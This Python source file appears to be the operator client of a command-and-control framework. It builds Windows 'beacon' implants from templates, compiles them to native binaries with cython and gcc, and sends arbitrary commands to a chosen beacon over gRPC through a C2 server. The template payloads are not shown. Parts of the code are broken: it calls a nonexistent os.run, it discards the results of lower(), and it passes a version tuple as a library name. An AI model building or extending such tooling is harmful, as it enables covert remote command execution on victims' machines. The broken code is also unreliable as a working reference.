import Functemplates
import os
import sys
import grpc
import protobuff_pb2_grpc as pb2_grpc
import protobuff_pb2 as pb2
class UnaryClient(object):
    """
    Client for gRPC functionality
    """

    def __init__(self):
        self.host = 'localhost'
        self.server_port = 50051

        # instantiate a channel
        self.channel = grpc.insecure_channel(
            '{}:{}'.format(self.host, self.server_port))

        # bind the client and the server
        self.stub = pb2_grpc.UnaryStub(self.channel)

    def get_url(self, message, beaconID, opt):
        """
        Client function to call the rpc for GetServerResponse
        """
        message = pb2.Message(bID=beaconID, message=message, opt=opt)
        print(f'{message}')
        return self.stub.GetServerResponse(message)
def BobTheBuilder():
    buildmeabeacon = input("Are we building Win or Nix? >")

    buildmeabeacon.lower()

    if buildmeabeacon == "win":
        with open("out.py", 'w') as f:
            f.write(Functemplates.WINCMDEXEC + '\n' + Functemplates.BASE)
def FarmerPickles(PyFileName):
    buildmeaexe = input("Are we building a bin or an exe? >")

    buildmeaexe.lower()

    if buildmeaexe == "bin":
        os.run(f"cython {PyFileName}.py --embed")
        PYTHONLIBVER = sys.version_info[:2]
        os.run(f"gcc -Os $(python3-config --includes) {PyFileName}.c -o output_bin_file $(python3-config --ldflags) -l {PYTHONLIBVER}")
def SendCommand(beaconID):
    '''
    This uses gRPC to talk with the C2
    We take the command to run and the beaconID to update and write it to the beacons file
    The C2 awaits the POST response and then sends that back over here
    :param command: The command to run
    :param beaconID: The beacon we want to target
    :return: Get the result of the command
    '''
    command = input("> ")
    opt = input("> ")
    client = UnaryClient()
    result = client.get_url(message=command, beaconID=beaconID, opt=opt)
    print(f'{result}')

if __name__ == '__main__':
    bID = input("> ")
    SendCommand(bID)